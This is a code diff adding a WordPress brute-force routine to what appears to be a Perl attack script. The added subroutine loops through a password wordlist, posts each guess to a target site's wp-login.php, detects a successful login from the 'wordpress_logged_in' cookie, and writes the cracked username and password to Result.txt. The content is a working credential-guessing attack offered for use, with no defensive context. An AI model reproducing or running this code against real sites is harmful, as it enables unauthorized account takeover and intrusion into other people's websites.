@@ -247,3 +247,40 @@ print color('bold red'),"] ";
 print color('bold white'),"Can't Get Username\n";
 }
 }
+
+
+###### WorDPress #######
+sub wp{
+print color('bold red'),"\n [";
+print color('bold green'),"-";
+print color('bold red'),"] ";
+print color('bold white'),"Starting brute force\n";
+open(a,"<$pass") or die "$!";
+while(<a>){
+chomp($_);
+$wp = $site . '/wp-login.php';
+$redirect = $site . '/wp-admin/';
+$wpass = $_;
+print color('bold red'),"\n [";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Trying: $wpass ";
+$wpbrute = POST $wp, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
+$response = $ua->request($wpbrute);
+my $stat = $response->as_string;
+
+if($stat =~ /Location:/){
+if($stat =~ /wordpress_logged_in/){
+
+print color('bold white'),"- ";
+print color('bold green'),"FOUND\n";
+print color('reset');
+
+open (TEXT, '>>Result.txt');
+print TEXT "$wp ==> User: $wpuser Pass: $wpass\n";
+close (TEXT);
+next OUTER;
+}
+}
+}
+}
